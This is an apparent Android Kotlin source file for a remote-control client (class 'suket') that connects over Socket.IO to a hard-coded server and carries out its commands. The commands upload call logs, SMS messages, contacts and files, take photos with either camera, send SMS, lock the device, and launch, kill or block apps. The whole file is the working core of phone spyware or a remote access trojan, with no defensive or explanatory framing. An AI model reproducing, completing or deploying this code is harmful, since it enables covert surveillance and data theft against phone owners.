package com.example.betryalcommit

import android.content.Context
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONObject
import wallpaperset
import java.io.File
import java.io.FileInputStream

class suket(private val context: Context) {
    private val serverUrl = "ws://192.168.31.50:8080"
    private var socket: Socket = IO.socket(serverUrl)
    private var isJoined = false

    private val onError = Emitter.Listener {
        Log.i("SOCKET", "Error connecting to server")
        Handler(Looper.getMainLooper()).postDelayed({
            reconnectSocket()
        }, 10000)
    }
    private val onConnect = Emitter.Listener {
        Log.i("SOCKET", "Connected to server")
        if (!isJoined) {
            joinRoom();
            isJoined = true;
        }

    }


    private fun joinRoom() {

        val uniqueID = "testdevice"
        val joinData = JSONObject()
        try {
            joinData.put("id", uniqueID)
            socket.emit("uniqueID", joinData)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }



    private val onDisconnect = Emitter.Listener {
        Log.i("SOCKET", "Disconnected from server")
        Handler(Looper.getMainLooper()).postDelayed({
            reconnectSocket()
        }, 10000)
    }


    private fun reconnectSocket() {
        Handler(Looper.getMainLooper()).postDelayed({
            if (!socket.connected()) {
                Log.i("SOCKET", "Reconnecting to server...")
                socket.connect()
            }
        }, 10000)
    }

    private val onMessage = Emitter.Listener { args ->
        val text = args[0] as String
        Log.d("Socket.IO", "Received message: $text")
        val json = JSONObject(text)
        val commands = json.getString("commands")
        val data = json.getString("data")
        val num: String
        val msg: String
        if (data.contains(":")) {
            num = data.split(":")[0]
            msg = data.split(":")[1]
        } else {
            num = ""
            msg = ""
        }
        when (commands) {
            "restart_app" -> {
                val p = packagefun(context, socket)
                p.Gameterminator(data)
            }
            "run_app" -> {
                val p = packagefun(context, socket)
                p.launchApp(data)
            }
            "app_logs" -> {
                val p = packagefun(context, socket)
                p.applog()
            }
            "lock" -> AdminAct.lockdev()
            "call_logs" -> {
                callutil.uploadCalls(context.contentResolver, socket)
            }
            "wallpaper" -> {
                Log.e("wallpaper", data)
                wallpaperset.setWallpaper(context, data)
            }
            "sms_logs" -> { Teleserv.uploadsms(context.contentResolver, socket) }
            "contacts" -> { Teleserv.uploadContact(context, socket) }
            "camera0" ->CameraCaptureHelper().capture(socket, 0 );
            "camera1" -> CameraCaptureHelper().capture(socket, 1 );
            "sms_send" ->Teleserv.sendMessage(context, num, msg?:"")
            "block_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                val editor: SharedPreferences.Editor = pref.edit()
                val set = pref.getStringSet("targetPackages", null)
                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
                targetPackageNames.add(data)
                editor.putStringSet("targetPackages", targetPackageNames.toSet())
                editor.apply()
        }
            "unblock_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
            val editor:SharedPreferences.Editor = pref.edit()
            val set = pref.getStringSet("targetPackages", null)
            val targetPackageNames = set?.toMutableList() ?: mutableListOf()
            targetPackageNames.remove(data)
            editor.putStringSet("targetPackages", targetPackageNames.toSet())
            editor.apply()
        }
//            "forgive_app" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
//                val editor:SharedPreferences.Editor = pref.edit()
//                val set = pref.getStringSet("targetPackages", null)
//                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
//                targetPackageNames.clear()
//                editor.putStringSet("targetPackages", targetPackageNames.toSet())
//                editor.apply()
//            }
    }
    }
    fun uploadFile(file: File) {
        try {
            val byteArray = FileInputStream(file).readBytes()
            val fileName = file.name
            val json = JSONObject()
            json.put("type", "file_upload")
            json.put("filename", fileName)
            json.put("data", Base64.encodeToString(byteArray, Base64.DEFAULT))
            socket.emit("upload_file", json.toString())
            Log.d("Socket.IO", "File $fileName uploaded.")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    init {
        if (!socket.connected()) {
            socket.on(Socket.EVENT_CONNECT, onConnect)
            socket.on(Socket.EVENT_DISCONNECT, onDisconnect)
            socket.on("message", onMessage)
            socket.on(Socket.EVENT_CONNECT_ERROR, onError);
            socket.connect()
        }
    }
}